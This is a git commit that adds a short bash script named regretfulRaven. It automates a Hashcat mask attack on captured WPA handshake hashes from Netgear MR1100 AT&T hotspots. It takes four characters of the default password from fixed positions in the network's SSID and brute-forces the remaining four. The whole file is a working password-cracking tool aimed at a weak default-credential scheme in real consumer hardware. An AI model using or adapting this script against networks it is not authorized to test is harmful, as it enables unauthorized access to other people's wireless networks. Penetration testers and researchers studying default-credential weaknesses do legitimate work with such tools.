7d31add63a2b7cd0cb6e83b61d83a5843cb069d2
bmshema <92175742+bmshema@users.noreply.github.com>
2023-05-21 22:20:12 -0500

    Added mr1100 default credential exploitation automation script

---
+++ mr1100_creds.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+#                                                                                                  
+# Name: regretfulRaven                                                                                
+# Version: 0.1.0                                                                                      
+# Author: bmshema
+# Description: Executes a mask attack with Hashcat to exploit Netgear AT&T hotspot default credentials
+
+# Input variables for SSID and hash file name
+echo 'SSID: '
+read SSID
+# Takes hashcat hash type 22000 format
+echo 'Hashfile Name: '
+read HASHFILE
+
+# SSID positional variables
+SECOND=${SSID:9:1}
+FOURTH=${SSID:10:1}
+SIXTH=${SSID:12:1}
+EIGHTH=${SSID:11:1}
+
+# Hashcat attack
+hashcat -a 3 -m 22000 $HASHFILE ?a${SECOND}?a${FOURTH}?a${SIXTH}?a${EIGHTH}
